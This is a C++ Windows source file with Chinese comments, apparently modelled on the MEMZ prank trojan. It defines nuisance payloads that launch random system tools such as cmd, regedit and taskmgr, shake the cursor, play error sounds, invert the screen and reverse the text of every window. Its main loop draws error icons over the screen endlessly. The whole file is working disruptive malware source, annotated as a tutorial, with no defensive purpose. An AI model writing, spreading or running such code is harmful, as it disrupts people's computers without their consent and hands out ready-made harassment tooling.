//
//main.cpp
//

#include <Windows.h>

#define         MAX_EXECUTE         8
#define         MAX_SOUNDS          3

//PlaySound函数需要Winmm.lib库文件
#pragma comment(lib, "Winmm.lib")

int cursor_freq = 0;
HCRYPTPROV prov;

//定义需要随机打开的程序
LPCWSTR lpExecuteName[MAX_EXECUTE] = {
    L"calc",        //计算器
    L"cmd",         //命令提示符
    L"explorer",    //资源管理器
    L"mspaint",     //画图
    L"taskmgr",     //任务管理器
    L"regedit",     //注册表
    L"write",       //写字板
    L"credwiz"     //用户工具
};
//提示音列表
LPCWSTR lpSoundsName[MAX_SOUNDS] = {
    L"SystemHand",
    L"SystemQuestion",
    L"SystemExclamation"
};

//生成随机数
int random()
{
    if (prov == NULL)
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);
    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
    return out & 0x7fffffff;
}

//打开随机程序
void PlayloadExecute()
{
    //获取桌面窗口的句柄
    HWND hDesktop = GetDesktopWindow();
    //打开任意程序
    ShellExecute(hDesktop, L"open", lpExecuteName[random() % MAX_EXECUTE], NULL, NULL, SW_SHOWNORMAL);
}
//光标抖动
void PlayloadCursor()
{
    //获取当前光标位置
    POINT cursor;
    GetCursorPos(&cursor);
    //设置光标位置
    SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 2)));
}
//错误的提示声效
void PlayloadSound()
{
    //播放随机提示音
    PlaySound(lpSoundsName[random() % MAX_SOUNDS], GetModuleHandle(NULL), SND_SYNC);
}
//颜色反转
void PlayloadBlink()
{
    //获取窗口句柄
    HWND hDesktop = GetDesktopWindow();
    //获取窗口dc
    HDC hdc = GetWindowDC(hDesktop);
    //获取桌面窗口信息
    RECT rekt;
    GetWindowRect(hDesktop, &rekt);
    //将屏幕颜色反转
    BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
    //释放dc
    ReleaseDC(hDesktop, hdc);
}
//绘制错误图标
void PlayloadIcon()
{
    //获取桌面宽
    int iDesktopWidth = GetSystemMetrics(SM_CXSCREEN);
    //获取桌面高
    int iDesktopHeight = GetSystemMetrics(SM_CYSCREEN);
    //获取窗口句柄
    HWND hDesktop = GetDesktopWindow();
    //获取窗口dc
    HDC hdc = GetWindowDC(hDesktop);
    //获取光标位置
    POINT cursor;
    GetCursorPos(&cursor);
    //在光标位置处画错误图标
    DrawIcon(hdc, cursor.x - 10, cursor.y - 10, LoadIcon(NULL, IDI_ERROR));
    //在屏幕随机位置画上警告图标
    if (random() % 3 == 0)       //取随机数,如果此数能被3整除则在屏幕上任意位置画一个警告标志
        DrawIcon(hdc, random() % iDesktopWidth, random() % iDesktopHeight, LoadIcon(NULL, IDI_WARNING));
}

//文本翻转
BOOL ReverseTCHAR(TCHAR* lpSrc)
{
    //获取字符串长度
    int size = lstrlenW(lpSrc);
    //如果为0就返回false
    if (size == 0)
        return FALSE;

    /*
    将第一个字符先赋值给临时变量wchar，再将最后一个字符赋值给第一个字符，
    使第一个字符变成最后一个字符，再将wchar里的字符赋值给最后一个字符，
    重复此操作使字符串反转
    */
    TCHAR wchar = 0;
    for (int i = 0; i < (size / 2); i++)
        // i < (size / 2) 是为了防止二次反转，如果不懂拿个草稿纸自己写一下反转全过程就会明白了
    {
        wchar = lpSrc[i];
        lpSrc[i] = lpSrc[size - i - 1];
        lpSrc[size - i - 1] = wchar;
    }

    return TRUE;
}
//枚举所有子窗口的回调函数
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    TCHAR str[8192] = { 0 };
    //发送WM_GETTEXT获取标题文本
    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
        //反转文本
        ReverseTCHAR(str);
        //发送WM_SETTEXT重新设置标题文本
        SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }

    return TRUE;
}
//文字反转
void PlayloadChangeText()
{
    //枚举所有子窗口
    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE PrevhInstance, LPSTR lpCmdLine, int nCmdShow)
{
    while (1)
    {
        PlayloadIcon();
        Sleep(200);
    }
    return 0;
}